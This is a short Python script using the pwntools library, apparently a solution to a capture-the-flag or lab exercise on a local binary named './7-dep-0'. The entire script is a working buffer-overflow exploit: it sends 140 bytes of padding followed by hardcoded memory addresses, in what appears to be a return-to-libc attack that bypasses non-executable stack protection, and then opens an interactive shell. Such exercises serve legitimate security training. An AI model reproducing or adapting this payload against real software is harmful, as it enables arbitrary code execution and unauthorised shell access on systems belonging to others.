#!/usr/bin/env python3
from pwn import *
from pwn import context, gdb, p32, process

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "DEBUG"

io = process(["./7-dep-0"])
io.recv()
payload = b"a" * 140 + p32(0xF7E3ADB0) + b"ABCD" + p32(0xF7F5BB2B)
io.sendline(payload)
io.interactive()
